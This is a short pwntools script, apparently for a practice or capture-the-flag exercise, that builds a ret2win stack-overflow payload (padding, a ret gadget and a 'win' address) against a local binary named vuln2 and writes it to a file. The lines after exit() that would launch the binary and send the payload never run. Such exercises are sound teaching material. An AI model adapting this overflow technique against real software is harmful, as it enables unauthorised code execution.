from pwn import *

WIN_ADDR = 0x401176
RET_ADDR = 0x4011a3
context.log_level = 'debug'

pl = b'a' * 0x28 + p64(RET_ADDR) +  p64(WIN_ADDR)
with open("./example2/pl", "wb") as f:
    f.write(pl)
exit()
p = process("./example2/vuln2")
# pause()
p.sendline(pl)
p.interactive()